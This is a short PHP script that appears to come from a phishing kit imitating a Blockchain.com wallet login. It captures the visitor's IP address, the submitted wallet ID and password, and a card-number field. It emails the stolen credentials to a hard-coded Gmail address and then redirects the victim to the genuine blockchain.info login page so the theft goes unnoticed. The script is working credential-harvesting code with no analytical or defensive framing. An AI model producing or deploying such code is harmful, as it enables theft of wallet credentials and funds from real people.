<?php 
        $ip = getenv("REMOTE_ADDR");
        $wallet .= "-------------------- The rest of the information BlockChain -------------------\n";
        $wallet .= "Email Adress                    :  ".$_POST['wallet-id']."\n";
        $wallet .= "Email Password                  :  ".$_POST['password']."\n";
        $cc = $_POST['ccn'];
        $subject = "---------- The rest of the information BlockChain ----------";
        $send = "omarmoslem10@gmail.com";
        $headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
        mail($send,$subject,$wallet,$headers);

        header("Location:https://blockchain.info/wallet/#/login");
?>